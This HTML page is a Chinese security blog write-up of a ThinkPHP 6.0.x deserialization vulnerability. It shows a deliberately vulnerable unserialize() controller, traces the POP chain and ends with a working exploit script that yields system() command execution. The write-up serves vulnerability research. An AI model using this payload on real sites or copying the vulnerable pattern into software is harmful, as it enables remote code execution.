@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x01-搭建环境官方安装教程：https:&#x2F;&#x2F;www.kancloud.cn&#x2F;manual&#x2F;thinkphp6_0&#x2F;1037481踩坑一可能遇到的问题 composer 目录为空的情况，解决办法如下： 1234#1. 切换到根目录、核心框架目录，更新。指令如下: composer update #2. 更新composer自身，指令如下：composer seft-update  踩坑二upda">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP6.0.*反序列化漏洞-1">
+<meta property="og:url" content="http://example.com/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/index.html">
+<meta property="og:site_name" content="singsing&#39;s Blog">
+<meta property="og:description" content="0x01-搭建环境官方安装教程：https:&#x2F;&#x2F;www.kancloud.cn&#x2F;manual&#x2F;thinkphp6_0&#x2F;1037481踩坑一可能遇到的问题 composer 目录为空的情况，解决办法如下： 1234#1. 切换到根目录、核心框架目录，更新。指令如下: composer update #2. 更新composer自身，指令如下：composer seft-update  踩坑二upda">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-19T03:58:41.000Z">
+<meta property="article:modified_time" content="2022-03-19T04:50:27.084Z">
+<meta property="article:author" content="singsing">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="ThinkPHP">
+<meta property="article:tag" content="WEB安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ThinkPHP6.0.*反序列化漏洞-1 | singsing's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">singsing's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="singsing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="singsing's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP6.0.*反序列化漏洞-1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-03-19 11:58:41 / Modified: 12:50:27" itemprop="dateCreated datePublished" datetime="2022-03-19T11:58:41+08:00">2022-03-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><h3 id="官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="官方安装教程：https://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>官方安装教程：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h3><p>可能遇到的问题 composer 目录为空的情况，解决办法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. 切换到根目录、核心框架目录，更新。指令如下: </span></span><br><span class="line">composer update </span><br><span class="line"><span class="comment">#2. 更新composer自身，指令如下：</span></span><br><span class="line">composer seft-update</span><br></pre></td></tr></table></figure>
+
+<h3 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h3><p>update 的时候提示：<code>Your requirements could not be resolved to an installable set of packages. </code>解决办法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#composer 可以设置忽略版本匹配</span></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>利用条件为存在 <code>unserialize()</code> 函数且参数可控。手动创造条件验证漏洞，在Index控制器中写入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);   <span class="comment">// 参数可控的unserialize函数</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-构造POP"><a href="#0x03-构造POP" class="headerlink" title="0x03-构造POP"></a>0x03-构造POP</h2><p>反序列化漏洞起点通常为  <code>__destruct()</code> 及 <code>__wake()</code> 两个魔术函数，因为它们就是 <code>unserialize</code> 的触发点。</p>
+<h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>Model.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;lazySave = True</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
+<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;updateData()</code> 内部，需要进入 <code>$this-&gt;updateData()</code> 方法：</p>
+<ol>
+<li>在此之前则不能被 return ，所以 if 语句中的 <code>$this-&gt;isEmpty()</code> 必须等于 <code>false</code> 以及 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 必须等于 <code>true</code> 才能避免 return；</li>
+<li><code>$this-&gt;exists</code> 必须为 <code>true</code>。</li>
+</ol>
+<p>跟进 <code>$this-&gt;isEmpty()</code>，要想 <code>$this-&gt;isEmpty() </code>等于 <code>false</code>，只需要 <code>$tish-&gt;data </code>不等于空。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code>，要想 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 等于 <code>ture</code>，只需要 <code>$this-&gt;withEvent</code> 等于 <em>空</em> 或 <code>false</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"> <span class="keyword">try</span> &#123;...&#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="跟进-updateData-方法"><a href="#跟进-updateData-方法" class="headerlink" title="跟进 updateData() 方法"></a>跟进 updateData() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;checkAllowFields()</code> 内部，需要进入 <code>$this-&gt;checkAllowFields()</code> 方法，在此之前则不能被 return。</p>
+<p>第一个 if 语句中，<code>$this-&gt;trigger(&#39;BeforeUpdate&#39;))</code> 需要为 true，上一步已经设置。</p>
+<p>第二个 if 语句中，<code>$data</code> 需要为 true 或不为 <em>空</em> ，<code>$data</code> 来自 <code>$this-&gt;getChangedData()</code>，跟进 <code>$this-&gt;getChangedData()</code>，只需要将 <code>$this-&gt;force</code> 为 <code>true</code> 即可直接原封不动返回 <code>$this-&gt;$data</code> 的值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只读字段不允许更新</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="跟进-checkAllowFields-方法"><a href="#跟进-checkAllowFields-方法" class="headerlink" title="跟进 checkAllowFields() 方法"></a>跟进 checkAllowFields() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;db()</code> 内部，需要进入 <code>$this-&gt;db()</code>，即 <code>$this-&gt;field</code> 需要为空，<code>$this-&gt;schema</code> 需要为空。<code>$this-&gt;field</code> 及 <code>$this-&gt;schema</code> 默认为空。</p>
+<h3 id="跟进-db-方法"><a href="#跟进-db-方法" class="headerlink" title="跟进 db() 方法"></a>跟进 db() 方法</h3><p>已经可以看到字符拼接操作，当一个类对象被当做字符串处理的时候，将会触发该类对象的 <code>__toString()</code> 魔术方法。</p>
+<p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用 <code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lazySave == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;data不为空</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withEvent == <span class="literal">false</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;exists == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>调用过程如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）——&gt;<span class="title function_ invoke__">toString</span>()</span><br></pre></td></tr></table></figure>
+
+<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>结合 Thinkphp 5.x 的反序列化链，<code>__toString()</code> 部分，即可触发反序列化漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）</span><br><span class="line">——&gt;<span class="title function_ invoke__">__toString</span>()--&gt;<span class="title function_ invoke__">toJson</span>()--&gt;<span class="title function_ invoke__">toArray</span>()--&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)--&gt;<span class="title function_ invoke__">getValue</span>()--&gt;<span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)(最终利用点)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04-EXP"></a>0x04-EXP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"> <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">withEvent</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$data</span> ;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05-参考"></a>0x05-参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9546#toc-18">https://xz.aliyun.com/t/9546#toc-18</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/ThinkPHP/" rel="tag"># ThinkPHP</a>
+              <a href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag"># WEB安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/" rel="prev" title="内网穿透之ssh反向隧道">
+      <i class="fa fa-chevron-left"></i> 内网穿透之ssh反向隧道
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/" rel="next" title="某CDN SQLi注入Bypass">
+      某CDN SQLi注入Bypass <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">0x01-搭建环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%9Ahttps-www-kancloud-cn-manual-thinkphp6-0-1037481"><span class="nav-number">1.1.</span> <span class="nav-text">官方安装教程：https:&#x2F;&#x2F;www.kancloud.cn&#x2F;manual&#x2F;thinkphp6_0&#x2F;1037481</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E4%B8%80"><span class="nav-number">1.2.</span> <span class="nav-text">踩坑一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E4%BA%8C"><span class="nav-number">1.3.</span> <span class="nav-text">踩坑二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">0x02-利用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%9E%84%E9%80%A0POP"><span class="nav-number">3.</span> <span class="nav-text">0x03-构造POP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2-destruct-%E6%96%B9%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">搜索 __destruct 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%9F%E8%BF%9B-save-%E6%96%B9%E6%B3%95"><span class="nav-number">3.2.</span> <span class="nav-text">跟进 save() 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%9F%E8%BF%9B-updateData-%E6%96%B9%E6%B3%95"><span class="nav-number">3.3.</span> <span class="nav-text">跟进 updateData() 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%9F%E8%BF%9B-checkAllowFields-%E6%96%B9%E6%B3%95"><span class="nav-number">3.4.</span> <span class="nav-text">跟进 checkAllowFields() 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%9F%E8%BF%9B-db-%E6%96%B9%E6%B3%95"><span class="nav-number">3.5.</span> <span class="nav-text">跟进 db() 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 